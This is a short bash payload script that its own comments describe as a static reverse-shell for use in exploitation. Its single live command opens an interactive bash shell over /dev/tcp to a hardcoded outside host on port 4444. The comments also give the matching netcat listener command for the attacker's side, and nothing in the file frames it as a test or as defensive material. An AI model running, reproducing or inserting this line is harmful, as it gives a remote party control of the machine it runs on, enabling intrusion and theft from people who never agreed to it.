#!/bin/bash
# author: yulibao
# this script is a static version of revers.sh, for some specital treatement in exploitation

# remote listening may be like this: 
#   nc -lvvp 4444

# and connect to ir by:
# ./forPoayload.sh

# change the hardcoded address before using
bash -i >& /dev/tcp/ddns.randomhhh.top/4444 0>&1